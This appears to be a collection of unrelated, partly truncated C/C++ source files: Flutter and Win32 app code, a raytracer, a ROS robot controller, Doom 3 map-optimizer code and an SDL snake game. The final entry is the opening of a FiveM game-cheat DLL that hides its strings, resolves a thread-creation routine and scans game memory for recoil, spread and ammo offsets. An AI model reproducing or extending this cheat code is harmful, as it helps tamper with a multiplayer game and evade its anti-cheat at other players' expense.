    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"hhe\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <windows.h>\n#include \"module1.h\"\n#include \"module2.h\"\n#include \"resource.h\"\n\n#define ID_WORK1 1\n#define ID_WORK2 2\n\nLRESULT CALLBACK WindowProcedure(HWND, UINT, WPARAM, LPARAM);\n\nint WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR args, int ncmdshow)\n{\n    HWND hwnd;\n    MSG messages;\n    WNDCLASSEX wincl;\n\n    wincl.hInstance = hInst;\n    wincl.lpszClassName = TEXT(\"Lab4Class\");\n    wincl.lpfnWndProc = WindowProcedure;\n    wincl.style = CS_DBLCLKS;\n    wincl.cbSize = sizeof(WNDCLASSEX);\n\n    wincl.hIcon = LoadIcon(NULL, IDI_APPLICATION);\n    wincl.hIconSm = LoadIcon(NULL, IDI_APPLICATION);\n    wincl.hCursor = LoadCursor(NULL, IDC_ARROW);\n    wincl.lpszMenuName = MAKEINTRESOURCE(IDR_MAINMENU);\n    wincl.cbClsExtra = 0;\n    wincl.cbWndExtra = 0;\n    wincl.hbrBackground = (HBRUSH)COLOR_BACKGROUND;\n\n    if (!RegisterClassEx(&wincl))\n        return 0;\n\n    hwnd = CreateWindowEx(\n        0,\n        TEXT(\"Lab4Class\"),\n        TEXT(\"Lab4\"),\n        WS_OVERLAPPEDWINDOW,\n        CW_USEDEFAULT,\n        CW_USEDEFAULT,\n        544,\n        375,\n        HWND_DESKTOP,\n        NULL,\n        hInst,\n        NULL\n    );\n\n    ShowWindow(hwnd, ncmdshow);\n\n    while (GetMessage(&messages, NULL, 0, 0))\n    {\n        TranslateMessage(&messages);\n        DispatchMessage(&messages);\n    }\n\n    return messages.wParam;\n}\n\nLRESULT CALLBACK WindowProcedure(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    static int number = 0;\n    wchar_t buffer[4];\n\n    switch (message)\n    {\n    case WM_CREATE:\n    {\n        HMENU hMenu = CreateMenu();\n        AppendMenu(hMenu, MF_STRING, ID_WORK1, TEXT(\"\u0420\u043e\u0431\u043e\u0442\u04301\"));\n        AppendMenu(hMenu, MF_STRING, ID_WORK2, TEXT(\"\u0420\u043e\u0431\u043e\u0442\u04302\"));\n        SetMenu(hwnd, hMenu);\n    }\n    break;\n\n    case WM_COMMAND:\n    {\n        switch (LOWORD(wParam))\n        {\n        case ID_WORK1:\n            Func_MOD1(hwnd);\n            break;\n\n        case ID_WORK2:\n            Func_MOD2(hwnd);\n            break;\n\n        case IDM_EXIT:\n            PostQuitMessage(0);\n            break;\n\n        case IDM_ABOUT:\n            DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_ABOUTBOX), hwnd, [](HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) -> INT_PTR {\n                if (message == WM_COMMAND)\n                {\n                    if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)\n                    {\n                        EndDialog(hDlg, LOWORD(wParam));\n                        return (INT_PTR)TRUE;\n                    }\n                }\n                return (INT_PTR)FALSE;\n                });\n            break;\n        }\n    }\n    break;\n\n    case WM_USER + 1:\n        number = (int)wParam;\n        InvalidateRect(hwnd, NULL, TRUE);\n        break;\n\n    case WM_PAINT:\n    {\n        PAINTSTRUCT ps;\n        HDC hdc = BeginPaint(hwnd, &ps);\n        TextOut(hdc, 10, 10, TEXT(\"\u0412\u0438\u0431\u0440\u0430\u043d\u0435 \u0447\u0438\u0441\u043b\u043e: \"), 16);\n        _itow_s(number, buffer, 10);\n        TextOut(hdc, 130, 10, buffer, wcslen(buffer));\n        EndPaint(hwnd, &ps);\n    }\n    break;\n\n    case WM_DESTROY:\n        PostQuitMessage(0);\n        break;\n\n    default:\n        return DefWindowProc(hwnd, message, wParam, lParam);\n    }\n    return 0;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "//\n//  main.cpp\n//  raytracer 1\n//\n//  Created by Admin on 22/12/23.\n//\n\n#include <stdio.h>\n#include <fstream>\n#include <string>\n#include <iostream>\n#include <cstdlib>\n#include <sstream>\n#include \"camera.hpp\"\n#include \"hitable_list.hpp\"\n#include \"bvh_node.hpp\"\n#include \"sphere.hpp\"\n#include \"metal_mat.hpp\"\n#include \"lambertian.hpp\"\n#include \"dielectric.hpp\"\n#include \"checker_texture.hpp\"\n#include \"noise_texture.hpp\"\n#include \"image_texture.hpp\"\n#include \"diffuse_light.hpp\"\n#include \"xy_rect.hpp\"\n#include \"yz_rect.hpp\"\n#include \"xz_rect.hpp\"\n#include \"box.hpp\"\n#include \"flip_normals.hpp\"\n#include \"texture.hpp\"\n#include \"constant_medium.hpp\"\n#include \"translate.hpp\"\n#include \"rotate_y.hpp\"\n\n#define STB_IMAGE_IMPLEMENTATION\n#include \"stb_image.hpp\"\n\nusing namespace std;\ntypedef std::string str;\n\nFILE *fptr;\nray scattered;\nvec3 attenuation;\nhit_record rec;\nvec3 unit_direction;\ndouble t;\n\nconst vec3 oneVector(1.0);\nconst vec3 zeroVector(0.0);\nconst vec3 fixedColor(0.5, 0.7, 1.0);\n\nvoid printToFile(int r, int g, int b)\n{\n\n    fprintf(fptr, \"%d\", r);\n    fprintf(fptr, \"%s\", \" \");\n    fprintf(fptr, \"%d\", g);\n    fprintf(fptr, \"%s\", \" \");\n    fprintf(fptr, \"%d\", b);\n    fprintf(fptr, \"%s\", \" \");\n    fprintf(fptr, \"%s\", \"\\n\");\n}\n\nvoid printInitialPPMCodeToFile(int nx, int ny)\n{\n\n    fprintf(fptr, \"%s\", \"P3\\n\");\n    fprintf(fptr, \"%d\", nx);\n    fprintf(fptr, \"%s\", \" \");\n    fprintf(fptr, \"%d\", ny);\n    fprintf(fptr, \"%s\", \"\\n255\\n\");\n}\ndouble getLightColor()\n{\n    double channelColor;\n    while (true)\n    {\n        channelColor = min(1.0, max(0.5, myrand));\n        if (channelColor > 0.5)\n            return channelColor;\n    }\n}\n\nvec3 getMyRandomColor()\n{\n    // rgb(255, 68, 51)\n    double r = floor(myrand * 15);\n    // double rand = floor(((double) rand() / (RAND_MAX))*15);\n    // cout<<(r)<<endl;\n    switch ((int)r)\n    {\n    case 0:\n        cout << endl\n             << \"r\" << r << \" \" << (double)210 / 255 << (double)105 / 255 << (double)30 / 255;\n        return vec3((double)210 / 255, (double)105 / 255, (double)30 / 255);\n        break;\n    case 1:\n        cout << endl\n             << \"r\" << r << \" \" << (double)255 / 255 << (double)105 / 255 << (double)180 / 255;\n        return vec3((double)255 / 255, (double)105 / 255, (double)180 / 255);\n        break;\n    case 2:\n        cout << endl\n             << \"r\" << r << \" \" << (double)255 / 255 << (double)20 / 255 << (double)147 / 255;\n        return vec3((double)255 / 255, (double)20 / 255, (double)147 / 255);\n        break;\n    case 3:\n        cout << endl\n             << \"r\" << r << \" \" << (double)255 / 255 << (double)0 / 255 << (double)0 / 255;\n        return vec3((double)255 / 255, (double)0 / 255, (double)0 / 255);\n        break;\n    case 4:\n        cout << endl\n             << \"r\" << r << \" \" << (double)255 / 255 << (double)69 / 255 << (double)0 / 255;\n        return vec3((double)255 / 255, (double)69 / 255, (double)0 / 255);\n        break;\n    case 5:\n        cout << endl\n             << \"r\" << r << \" \" << (double)255 / 255 << (double)255 / 255 << (double)0 / 255;\n        return vec3((double)255 / 255, (double)255 / 255, (double)0 / 255);\n        break;\n    case 6:\n        cout << endl\n             << \"r\" << r << \" \" << (double)0 / 255 << (double)0 / 255 << (double)255 / 255;\n        return vec3((double)0 / 255, (double)0 / 255, (double)255 / 255);\n        break;\n    case 7:\n        cout << endl\n             << \"r\" << r << \" \" << (double)0 / 255 << (double)191 / 255 << (double)255 / 255;\n        return vec3((double)0 / 255, (double)191 / 255, (double)255 / 255);\n        break;\n    case 8:\n        cout << endl\n             << \"r\" << r << \" \" << (double)0 / 255 << (double)0 / 255 << (double)128 / 255;\n        return vec3((double)0 / 255, (double)0 / 255, (double)128 / 255);\n        break;\n    case 9:\n        cout << endl\n             << \"r\" << r << \" \" << (double)255 / 255 << (double)0 / 255 << (double)255 / 255;\n        return vec3((double)255 / 255, (double)0 / 255, (double)255 / 255);\n        break;\n    case 10:\n        cout << endl\n             << \"r\" << r << \" \" << (double)148 / 255 << (double)0 / 255 << (double)211 / 255;\n        return vec3((double)148 / 255, (double)0 / 255, (double)211 / 255);\n        break;\n    case 11:\n        cout << endl\n             << \"r\" << r << \" \" << (double)0 / 255 << (double)255 / 255 << (double)255 / 255;\n        return vec3((double)0 / 255, (double)255 / 255, (double)255 / 255);\n        break;\n    case 12:\n        cout << endl\n             << \"r\" << r << \" \" << (double)73 / 255 << (double)255 / 255 << (double)47 / 255;\n        return vec3((double)73 / 255, (double)255 / 255, (double)47 / 255);\n        break;\n    case 13:\n        cout << endl\n             << \"r\" << r << \" \" << (double)4 / 255 << (double)139 / 255 << (double)34 / 255;\n        return vec3((double)4 / 255, (double)139 / 255, (double)34 / 255);\n        break;\n    case 14:\n        cout << endl\n             << \"r\" << r << \" \" << (double)238 / 255 << (double)130 / 255",
    "#include <ros/ros.h>\n#include <geometry_msgs/Twist.h>\n#include <nav_msgs/Odometry.h>\n#include <tf/transform_datatypes.h>\n#include <cmath>\n#include <iostream>\n#include <std_msgs/Int32.h>\n\n#include \"util.h\"\n#include \"a_star/a_star.h\"\n\n#define DEBUG 0\n#define DEBUG_TARGET_X 3\n#define DEBUG_TARGET_Y 0\n\nenum controlStage {\n  TURNING,\n  DRIVING,\n  IDLE,\n};\n\nenum dirac_orientation {\n  FORWARD = 0,\n  RIGHT = 1,\n  BACKWARD = 2,\n  LEFT = 3,\n};\n\ndirac_orientation robot_orientation = FORWARD;\n\nVector2 desiredPos{0, 0};\nvolatile controlStage currentControlStage = IDLE;\ndouble lastTime = 0;\n\n// Velocity limits\nconstexpr double maxAngularVel = 3;\nconstexpr double maxVel = 0.8;\n\n// PID control gains\nconstexpr double kp = 0.2;\nconstexpr double ki = 0.15;\nconstexpr double kd = 0.05;\n\n// Variables for PID control\ndouble errorIntegral = 0.0;\ndouble prevError = 0.0;\n\n// ROS publisher for cmd_vel topic\nros::Publisher cmd_vel_pub;\n\n// Current heading variable\nVector2 currentPos{0.499997, 0.500002}; //TODO Current pos: ( 0.499997 , 0.500002 )\n//Vector2 origin_offset{0.499997,0.500002};\n//Vector2 idealisedPos{0.0, 0.0};\ndouble currentHeading = 0.0;\n\ndouble stateChangeTimer = 0;\n\n\nint front_distance = 0;\nint left_distance = 0;\nint right_distance = 0;\n\n// Callback function for the PID control\nvoid pidControlCallback(const ros::TimerEvent &event) {\n  // Calculate the desired heading for driving along the circle\n  double time = event.current_real.toSec();\n  double td = time - lastTime;\n\n  if (lastTime == 0) {\n    lastTime = time;\n    return;\n  }\n  lastTime = time;\n\n  Vector2 currentToDesired = desiredPos - currentPos;\n  double desiredHeading = currentToDesired.getAngle();\n  double headingDiff = normalizeAngle(desiredHeading - currentHeading);\n\n  switch (currentControlStage) {\n    case TURNING: {\n      double angular_vel = std::max(-maxAngularVel, std::min(headingDiff * 2, maxAngularVel));\n      geometry_msgs::Twist cmd_vel_msg;\n      cmd_vel_msg.linear.x = 0;\n      cmd_vel_msg.angular.z = angular_vel;\n      cmd_vel_pub.publish(cmd_vel_msg);\n\n      //std::cout << \"TURNING - d: \" << desiredHeading << \" c: \" << currentHeading << \" diff: \" << headingDiff << \"\\n\";\n      if (std::abs(desiredHeading - currentHeading) < 0.05) {\n        std::cout << \"END OF TURNING\\n\";\n        std::cout << \"Current pos: ( \" << currentPos.getX() << \" , \" << currentPos.getY() << \" )\\n\";\n        std::cout << \"Desired pos: ( \" << desiredPos.getX() << \" , \" << desiredPos.getY() << \" )\\n\\n\";\n        currentControlStage = IDLE;\n      }\n    }\n    break;\n\n    case DRIVING: {\n      double angular_vel = std::max(-maxAngularVel, std::min(headingDiff * 1.5, maxAngularVel));\n      geometry_msgs::Twist cmd_vel_msg;\n      cmd_vel_msg.linear.x = 0;\n      cmd_vel_msg.angular.z = angular_vel;\n\n      double proportionalTerm = kp * currentToDesired.length();\n      errorIntegral += currentToDesired.length() * td;\n      double integralTerm = ki * errorIntegral;\n      double derivativeTerm = kd * (currentToDesired.length() - prevError) / td;\n      double pidOutput = std::min(maxVel, proportionalTerm + integralTerm + derivativeTerm);\n\n      prevError = currentToDesired.length();\n\n      cmd_vel_msg.linear.x = pidOutput;\n\n      //std::cout << \"Current pos: ( \" << currentPos.getX() << \" , \" << currentPos.getY() << \" )\\n\";\n      //std::cout << \"Desired pos: ( \" << desiredPos.getX() << \" , \" << desiredPos.getY() << \" )\\n\";\n      //std::cout << \"DRIVING - d: \" << desiredHeading << \" c: \" << currentHeading << \" diff: \" << headingDiff << \"\\n\";\n      //std::cout << \"DRIVING - d: \" << prevError << \" PID out: \" << pidOutput << \"\\n\";\n      /*if (headingDiff > 0.5)\n      {\n        errorIntegral = 0.0;\n        prevError = 0.0;\n        currentControlStage = TURNING;\n      } */\n\n      cmd_vel_pub.publish(cmd_vel_msg);\n\n      if ((std::abs((desiredPos - currentPos).getX()) < 0.1 && (robot_orientation == FORWARD || robot_orientation == BACKWARD))\n          ||\n          (std::abs((desiredPos - currentPos).getY()) < 0.1) && (robot_orientation == LEFT || robot_orientation == RIGHT)) {\n        std::cout << \"END OF DRIVING\\n\";\n        std::cout << \"Current pos: ( \" << currentPos.getX() << \" , \" << currentPos.getY() << \" )\\n\";\n        std::cout << \"Desired pos: ( \" << desiredPos.getX() << \" , \" << desiredPos.getY() << \" )\\n\\n\";\n        currentControlStage = IDLE;\n      }\n    }\n    break;\n\n    case IDLE:\n      geometry_msgs::Twist cmd_vel_msg;\n      cmd_vel_msg.linear.x = 0;\n      cmd_vel_msg.angular.z = 0;\n      cmd_vel_pub.publish(cmd_vel_msg);\n\n      break;\n  }\n}\n\n// Callback function for the odometry message\nvoid odomCallback(const nav_msgs::Odometry::ConstPtr &msg) {\n  currentPos = Vector2(msg->pose.pose.position.x, msg->pose.pose.position.y);\n  currentHeading = tf::getYaw(msg->pose.pose.orientation);\n}\n\nvoid frontDistanceCallback(const std_msgs::Int32::ConstPtr &msg) {\n  front_distance = msg->data;\n}\n\nvoid leftDistanceCallback(const std_msgs::Int32::ConstPtr &msg) {\n  left_distance = msg->data;\n}\n\nvoid r",
    "/*\n===========================================================================\n\nDoom 3 GPL Source Code\nCopyright (C) 1999-2011 id Software LLC, a ZeniMax Media company. \n\nThis file is part of the Doom 3 GPL Source Code (?Doom 3 Source Code?).  \n\nDoom 3 Source Code is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nDoom 3 Source Code is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with Doom 3 Source Code.  If not, see <http://www.gnu.org/licenses/>.\n\nIn addition, the Doom 3 Source Code is also subject to certain additional terms. You should have received a copy of these additional terms immediately following the terms and conditions of the GNU General Public License which accompanied the Doom 3 Source Code.  If not, please request a copy in writing from id Software at the address below.\n\nIf you have questions concerning this license or the applicable additional terms, you may contact in writing id Software LLC, c/o ZeniMax Media Inc., Suite 120, Rockville, Maryland 20850 USA.\n\n===========================================================================\n*/\n\n#include \"precompiled.h\"\n#pragma hdrstop\n\n//#pragma optimize( \"\", off )\n\n#include \"dmap.h\"\n#ifdef WIN32\n#include <windows.h>\n#include <GL/gl.h>\n#endif\n\n/*\n\n  New vertexes will be created where edges cross.\n\n  optimization requires an accurate t junction fixer.\n\n\n\n*/\n\nidBounds\toptBounds;\n\n#define\tMAX_OPT_VERTEXES\t0x10000\nint\t\t\tnumOptVerts;\noptVertex_t optVerts[MAX_OPT_VERTEXES];\n\n#define\tMAX_OPT_EDGES\t\t0x40000\nstatic\tint\t\tnumOptEdges;\nstatic\toptEdge_t\toptEdges[MAX_OPT_EDGES];\n\nstatic bool IsTriangleValid( const optVertex_t *v1, const optVertex_t *v2, const optVertex_t *v3 );\nstatic bool IsTriangleDegenerate( const optVertex_t *v1, const optVertex_t *v2, const optVertex_t *v3 );\n\nstatic idRandom orandom;\n\n/*\n==============\nValidateEdgeCounts\n==============\n*/\nstatic void ValidateEdgeCounts( optIsland_t *island ) {\n\toptVertex_t\t*vert;\n\toptEdge_t\t*e;\n\tint\t\t\tc;\n\n\tfor ( vert = island->verts ; vert ; vert = vert->islandLink ) {\n\t\tc = 0;\n\t\tfor ( e = vert->edges ; e ; ) {\n\t\t\tc++;\n\t\t\tif ( e->v1 == vert ) {\n\t\t\t\te = e->v1link;\n\t\t\t} else if ( e->v2 == vert ) {\n\t\t\t\te = e->v2link;\n\t\t\t} else {\n\t\t\t\tcommon->Error( \"ValidateEdgeCounts: mislinked\" );\n\t\t\t}\n\t\t}\n\t\tif ( c != 2 && c != 0 ) {\n\t\t\t// this can still happen at diamond intersections\n//\t\t\tcommon->Printf( \"ValidateEdgeCounts: %i edges\\n\", c );\n\t\t}\n\t}\n}\n\n\n/*\n====================\nAllocEdge\n====================\n*/\nstatic optEdge_t\t*AllocEdge( void ) {\n\toptEdge_t\t*e;\n\n\tif ( numOptEdges == MAX_OPT_EDGES ) {\n\t\tcommon->Error( \"MAX_OPT_EDGES\" );\n\t}\n\te = &optEdges[ numOptEdges ];\n\tnumOptEdges++;\n\tmemset( e, 0, sizeof( *e ) );\n\n\treturn e;\n}\n\n/*\n====================\nRemoveEdgeFromVert\n====================\n*/\nstatic\tvoid RemoveEdgeFromVert( optEdge_t *e1, optVertex_t *vert ) {\n\toptEdge_t\t**prev;\n\toptEdge_t\t*e;\n\n\tif ( !vert ) {\n\t\treturn;\n\t}\n\tprev = &vert->edges;\n\twhile ( *prev ) {\n\t\te = *prev;\n\t\tif ( e == e1 ) {\n\t\t\tif ( e1->v1 == vert ) {\n\t\t\t\t*prev = e1->v1link;\n\t\t\t} else if ( e1->v2 == vert ) {\n\t\t\t\t*prev = e1->v2link;\n\t\t\t} else {\n\t\t\t\tcommon->Error( \"RemoveEdgeFromVert: vert not found\" );\n\t\t\t}\n\t\t\treturn;\n\t\t}\n\n\t\tif ( e->v1 == vert ) {\n\t\t\tprev = &e->v1link;\n\t\t} else if ( e->v2 == vert ) {\n\t\t\tprev = &e->v2link;\n\t\t} else {\n\t\t\tcommon->Error( \"RemoveEdgeFromVert: vert not found\" );\n\t\t}\n\t}\n}\n\n/*\n====================\nUnlinkEdge\n====================\n*/\nstatic\tvoid UnlinkEdge( optEdge_t *e, optIsland_t *island ) {\n\toptEdge_t\t**prev;\n\n\tRemoveEdgeFromVert( e, e->v1 );\n\tRemoveEdgeFromVert( e, e->v2 );\n\n\tfor ( prev = &island->edges ; *prev ; prev = &(*prev)->islandLink ) {\n\t\tif ( *prev == e ) {\n\t\t\t*prev = e->islandLink;\n\t\t\treturn;\n\t\t}\n\t}\n\n\tcommon->Error( \"RemoveEdgeFromIsland: couldn't free edge\" );\n}\n\n\n/*\n====================\nLinkEdge\n====================\n*/\nstatic\tvoid LinkEdge( optEdge_t *e ) {\n\te->v1link = e->v1->edges;\n\te->v1->edges = e;\n\n\te->v2link = e->v2->edges;\n\te->v2->edges = e;\n}\n\n#ifdef __linux__\n\noptVertex_t *FindOptVertex( idDrawVert *v, optimizeGroup_t *opt );\n\n#else\n\n/*\n================\nFindOptVertex\n================\n*/\nstatic optVertex_t *FindOptVertex( idDrawVert *v, optimizeGroup_t *opt ) {\n\tint\t\ti;\n\tfloat\tx, y;\n\toptVertex_t\t*vert;\n\n\t// deal with everything strictly as 2D\n\tx = v->xyz * opt->axis[0];\n\ty = v->xyz * opt->axis[1];\n\n\t// should we match based on the t-junction fixing hash verts?\n\tfor ( i = 0 ; i < numOptVerts ; i++ ) {\n\t\tif ( optVerts[i].pv[0] == x && optVerts[i].pv[1] == y ) {\n\t\t\treturn &optVerts[i];\n\t\t}\n\t}\n\n\tif ( numOptVerts >= MAX_OPT_VERTEXES ) {\n\t\tcommon->Error( \"MAX_OPT_VERTEXES\" );\n\t\treturn NULL;\n\t",
    "#include <SDL2/SDL.h>\n#include <stdio.h>\n#include <string>\n\nint main(){\n  SDL_Init(SDL_INIT_EVERYTHING);\n  auto window = SDL_CreateWindow(\"Snake\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 1000, 1000, 0);\n  auto renderer = SDL_CreateRenderer(window, -1, 0);\n  SDL_Event e;\n\n  enum Direction{\n    DOWN,\n    LEFT,\n    RIGHT,\n    UP\n  };\n  \n  bool running = true;\n  int dir=0;\n  SDL_Rect head {500, 500, 10, 10};\n  while(running){\n    while(SDL_PollEvent(&e)){\n      if(e.type == SDL_QUIT){ running = false; }\n      if(e.type == SDL_KEYDOWN){\n\tif(e.key.keysym.sym == SDLK_DOWN){ dir = DOWN; }\n\tif(e.key.keysym.sym == SDLK_UP){ dir = UP; }\n\tif(e.key.keysym.sym == SDLK_LEFT){ dir = LEFT; }\n\tif(e.key.keysym.sym == SDLK_RIGHT){ dir = RIGHT; }\t\n      }\n    }\n    \n    switch(dir){\n    case DOWN:\n      head.y += 10; break;\n    case UP:\n      head.y -= 10; break;\n    case LEFT:\n      head.x -= 10; break;\n    case RIGHT:\n      head.x += 10; break;\n    }\n\n    printf(\"%d \\n\", dir);\n    SDL_SetRenderDrawColor(renderer, 0, 0, 0, 255);\n    SDL_RenderClear(renderer);\n\n    SDL_SetRenderDrawColor(renderer, 255, 255, 255, 255);\n    SDL_RenderFillRect(renderer,&head);\n    \n    SDL_RenderPresent(renderer);\n    SDL_Delay(25);\n  }\n\n  return 0;\n}\n\n//hello\n",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier 